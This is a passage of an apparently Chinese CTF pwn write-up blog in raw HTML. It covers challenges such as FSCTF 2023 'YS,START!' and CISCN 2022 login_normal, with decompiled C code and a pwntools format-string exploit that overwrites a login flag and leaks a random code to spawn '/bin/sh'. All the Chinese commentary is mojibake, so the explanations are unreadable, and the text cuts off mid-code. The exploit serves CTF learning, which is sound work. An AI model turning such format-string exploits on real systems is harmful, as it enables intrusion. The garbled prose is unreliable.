class="line">    it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="d3ctf-2019-unprintablev"><a href="#d3ctf-2019-unprintablev" class="headerlink" title="d3ctf_2019_unprintablev"></a>d3ctf_2019_unprintablev</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115397.png" alt="image-20240513200949187"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115398.png" alt="image-20240513201206567"></p><p>ç¦æ‰äº†execve</p><p>å®åŠ›ä¸æµï¼ˆå…ˆé¸½äº†</p><h1 id="ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›-fmt"><a href="#ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›-fmt" class="headerlink" title="[ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›]fmt"></a>[ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›]fmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115399.png" alt="image-20240512212119545"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ ˆçš„åå››ä½åœ°å€ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆä¸€å¤´é›¾æ°´</p><p>å®åŠ›ä¸æµï¼ˆå…ˆé¸½äº†</p><h1 id="FSCTF-2023-YS-START"><a href="#FSCTF-2023-YS-START" class="headerlink" title="[FSCTF 2023]YS,START!"></a>[FSCTF 2023]YS,START!</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115400.png" alt="image-20240513225857029"></p><p>è¿™é¢˜ç›®æ¯”è¾ƒé˜´é—´çš„åœ°æ–¹å°±æ˜¯ä¸èƒ½åæ±‡ç¼–ï¼Œä½†æ˜¯æœ‰ç‚¹ç„å­¦ï¼Œå°±æ˜¯æŠŠret undefineæ‰å°±å¯ä»¥åæ±‡ç¼–äº†ï¼Œä¸ç†è§£ä½†æ˜¯å¤§ä¸ºéœ‡æ’¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [esp-F6h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-F2h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-EEh] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-EAh] [ebp-138h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-E6h] [ebp-134h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-E2h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-DEh] [ebp-12Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-DAh] [ebp-128h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-D6h] [ebp-124h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-D2h] [ebp-120h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp-CEh] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-CAh] [ebp-118h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-C6h] [ebp-114h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp-C2h] [ebp-110h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-BEh] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-BAh] [ebp-108h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-B6h] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-B2h] [ebp-100h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-A6h] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp-A2h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-9Ah] [ebp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-96h] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-92h] [ebp-E0h]</span></span><br><span class="line">  _DWORD v23[<span class="number">35</span>]; <span class="comment">// [esp-8Eh] [ebp-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-2h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> buf; <span class="comment">// [esp+2h] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+6h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+Ah] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Eh] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [esp+12h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">16</span>]; <span class="comment">// [esp+22h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [esp+32h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [esp+42h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  dword_804C044 = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  buf %= <span class="number">0xF4240</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciallo~(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†, What is your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, format, v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;,PLAY Genshin Impact?(y or n)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v24 + <span class="number">3</span>, <span class="number">1u</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(v24) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, &amp;v26, <span class="number">4u</span>);</span><br><span class="line">    read(fd, s2, <span class="number">0xF</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your account and password&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Account:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">      &amp;v27,</span><br><span class="line">      v18,</span><br><span class="line">      v19,</span><br><span class="line">      v23,</span><br><span class="line">      v20,</span><br><span class="line">      v21,</span><br><span class="line">      v22,</span><br><span class="line">      v23[<span class="number">0</span>],</span><br><span class="line">      v23[<span class="number">1</span>],</span><br><span class="line">      v23[<span class="number">2</span>],</span><br><span class="line">      v23[<span class="number">3</span>],</span><br><span class="line">      v23[<span class="number">4</span>],</span><br><span class="line">      v23[<span class="number">5</span>],</span><br><span class="line">      v23[<span class="number">6</span>],</span><br><span class="line">      v23[<span class="number">7</span>],</span><br><span class="line">      v23[<span class="number">8</span>],</span><br><span class="line">      v23[<span class="number">9</span>],</span><br><span class="line">      v23[<span class="number">10</span>],</span><br><span class="line">      v23[<span class="number">11</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%15s&quot;</span>,</span><br><span class="line">      s1,</span><br><span class="line">      v23[<span class="number">14</span>],</span><br><span class="line">      v23[<span class="number">15</span>],</span><br><span class="line">      v23[<span class="number">16</span>],</span><br><span class="line">      v23[<span class="number">17</span>],</span><br><span class="line">      v23[<span class="number">18</span>],</span><br><span class="line">      v23[<span class="number">19</span>],</span><br><span class="line">      v23[<span class="number">20</span>],</span><br><span class="line">      v23[<span class="number">21</span>],</span><br><span class="line">      v23[<span class="number">22</span>],</span><br><span class="line">      v23[<span class="number">23</span>],</span><br><span class="line">      v23[<span class="number">24</span>],</span><br><span class="line">      v23[<span class="number">25</span>],</span><br><span class="line">      v23[<span class="number">26</span>],</span><br><span class="line">      v23[<span class="number">27</span>],</span><br><span class="line">      v23[<span class="number">28</span>],</span><br><span class="line">      v23[<span class="number">29</span>],</span><br><span class="line">      v23[<span class="number">30</span>],</span><br><span class="line">      v23[<span class="number">31</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v27 == v26 &amp;&amp; !<span class="built_in">strcmp</span>(s1, s2) )        <span class="comment">// v26æ˜¯éšæœºæ•°</span></span><br><span class="line">      dword_804C044 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_804C044 )                        <span class="comment">// ç›´æ¥æ”¹è¿™ä¸ªä¸º1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login is risky. The verification code has been sent to 151xxxx1916&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please enter the verification code:&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span> *, _DWORD, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>))__isoc99_scanf)(</span><br><span class="line">        <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">        &amp;v27,</span><br><span class="line">        v23[<span class="number">34</span>],</span><br><span class="line">        v24,</span><br><span class="line">        buf,</span><br><span class="line">        v26);</span><br><span class="line">      <span class="keyword">if</span> ( v27 == buf )                         <span class="comment">// bufæ˜¯éšæœºæ•°</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Genshin Impact, start!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);                      <span class="comment">// getshell</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;verification code error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Account or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_80494D0();</span><br><span class="line">  JUMPOUT(<span class="number">0x80494C5</span>);                           <span class="comment">// ret</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘å¹¶ä¸éš¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28161)</span></span><br><span class="line"><span class="comment"># def debug():</span></span><br><span class="line"><span class="comment">#     gdb.attach(p)</span></span><br><span class="line"><span class="comment">#     pause()</span></span><br><span class="line"></span><br><span class="line">pal=p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%15$hn&#x27;</span>+<span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What is your name?\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">data=p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">5</span>:]</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;LAY Genshin Impact?(y or n)\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter your account and password\n&#x27;</span>,<span class="string">b&#x27;1\na&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter the verification code:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(data,<span class="number">16</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰“é€šäº†ã€‚ã€‚&#x2F;&#x2F;</p><h3 id="å¦‚ä½•è§£å†³ida7-7åç¼–è¯‘ä¸äº†"><a href="#å¦‚ä½•è§£å†³ida7-7åç¼–è¯‘ä¸äº†" class="headerlink" title="å¦‚ä½•è§£å†³ida7.7åç¼–è¯‘ä¸äº†"></a>å¦‚ä½•è§£å†³ida7.7åç¼–è¯‘ä¸äº†</h3><p>ä¹‹åå»é—®äº†èœå“¥ï¼Œä»–çš„8.3idaæ˜¯åç¼–è¯‘å¾—äº†çš„ï¼Œç„¶åæç¤ºä¿¡æ¯æ˜¯<code>0x80493A9</code>ä¸Šæ ˆå¸§å‡ºäº†é—®é¢˜ï¼Œè€Œæˆ‘ä»¬undefineæ‰retä¼šå‘ç°scanfçš„å‚æ•°ååˆ†çš„å¤šï¼Œè¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨äº†ï¼ˆä»¥å‰ä¸€ç›´ä»¥ä¸ºæ˜¯å¸¸æ€ï¼‰ï¼Œå› æ­¤åˆ°scanfç‚¹å‡»yï¼Œå°†å‚æ•°æ”¹æˆä¸¤ä¸ªå°±å¯ä»¥æˆåŠŸåç¼–è¯‘äº†<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115401.png" alt="image-20240514185748987"></p><p>è¿™æ ·å°±å¯ä»¥æˆåŠŸäº†<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115402.png" alt="image-20240514185809655"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸçš„ä»£ç å°±æ˜¯å¦‚æ­¤çš„èµå¿ƒæ‚¦ç›®</p><h1 id="CISCN-2022-åˆèµ›-login-normal"><a href="#CISCN-2022-åˆèµ›-login-normal" class="headerlink" title="[CISCN 2022 åˆèµ›]login_normal"></a>[CISCN 2022 åˆèµ›]login_normal</h1><p>æœ¬é¢˜çš„æ¼æ´ç‚¹ä¸éš¾ï¼Œåªæ˜¯é€†å‘è¦èŠ±ç‚¹æ—¶é—´</p><h2 id="é™æ€åˆ†æ-3"><a href="#é™æ€åˆ†æ-3" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¯»ç‚¹æ•°æ®ï¼Œç„¶åä¼ å‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *ptr2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// æ‰¾åˆ°ï¼šä¹‹åçš„æ•°æ®</span></span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span 